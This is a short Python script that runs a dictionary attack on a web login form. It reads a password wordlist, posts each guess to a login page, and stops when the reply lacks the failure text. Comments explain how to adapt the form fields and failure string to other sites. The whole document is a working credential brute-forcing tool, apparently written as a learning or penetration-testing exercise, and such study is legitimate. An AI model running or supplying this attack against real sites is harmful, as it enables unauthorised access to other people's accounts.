#!usr/bin/env python

import requests
target_url = "http://example.com/login.php"
data_dict = {"username":"blahblah", "password":"123", "login":"submit"}
# This data variable may easily vary depending on the html or js page.


with open("/root/Downloads/common-password.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data= data_dict)
        if "login failed" not in response.content.decode():
            # The wording might change based on the content.
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached the end of line")
# If printed this means our password list doesn't involve the right password.
